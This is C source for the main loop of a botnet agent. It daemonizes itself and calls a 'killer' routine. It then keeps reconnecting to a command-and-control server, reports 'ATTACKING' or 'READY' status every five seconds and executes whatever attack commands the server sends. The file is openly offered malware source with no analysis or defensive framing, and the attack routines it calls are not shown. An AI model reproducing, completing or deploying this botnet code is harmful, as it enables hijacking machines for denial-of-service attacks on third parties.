#include "bot.h"
#include "attack_methods.h"
#include "ascii_art.h"
#include "killer.h"
#include "daemon.h"
#include <curl/curl.h>
#include <json-c/json.h>

volatile int running = 1;
volatile int attack_active = 0;

void print_bot_status() {
    printf("\033[1;36m");
    printf("┌────────────────────── BOT STATUS ─────────────────────────────┐\n");
    printf("│ Status:    %-45s │\n", attack_active ? "ATTACKING" : "READY");
    printf("│ Memory:    %-45s │\n", "STABLE");
    printf("│ Connection:%-45s │\n", "ACTIVE");
    printf("│ Last CMD:  %-45s │\n", "WAITING");
    printf("└────────────────────────────────────────────────────────────────┘\n");
    printf("\033[0m");
}

void* stats_reporter(void* socket_ptr) {
    int sockfd = *(int*)socket_ptr;
    
    while(running) {
        char status[256];
        if(attack_active) {
            snprintf(status, sizeof(status), "STATUS:ATTACKING");
        } else {
            snprintf(status, sizeof(status), "STATUS:READY");
        }
        
        send(sockfd, status, strlen(status), 0);
        sleep(5);
    }
    
    return NULL;
}

int main(int argc, char *argv[]) {
    if(argc != 3) {
        printf("Usage: %s <cnc_ip> <cnc_port>\n", argv[0]);
        return 1;
    }
    
    print_banner();
    printf("\033[1;33m[*] Initializing bot system...\033[0m\n");
    print_loading(2);
    
    // Daemonize
    daemonize(argc, argv);
    
    // Start protection
    killer_main();
    
    const char* cnc_ip = argv[1];
    int cnc_port = atoi(argv[2]);
    
    printf("\033[1;32m[+] Bot initialized. Connecting to C&C at %s:%d\033[0m\n", cnc_ip, cnc_port);
    
    while(running) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if(sockfd < 0) {
            sleep(10);
            continue;
        }
        
        struct sockaddr_in serv_addr;
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(cnc_port);
        inet_pton(AF_INET, cnc_ip, &serv_addr.sin_addr);
        
        if(connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
            close(sockfd);
            sleep(30);
            continue;
        }
        
        printf("\033[1;32m[+] Connected to C&C server\033[0m\n");
        
        // Start stats reporting
        pthread_t stats_thread;
        pthread_create(&stats_thread, NULL, stats_reporter, &sockfd);
        
        // Main command loop
        char buffer[1024];
        while(running) {
            int bytes = recv(sockfd, buffer, sizeof(buffer)-1, 0);
            if(bytes <= 0) break;
            
            buffer[bytes] = 0;
            execute_attack_command(buffer);
        }
        
        close(sockfd);
        pthread_join(stats_thread, NULL);
        sleep(10);
    }
    
    return 0;
}
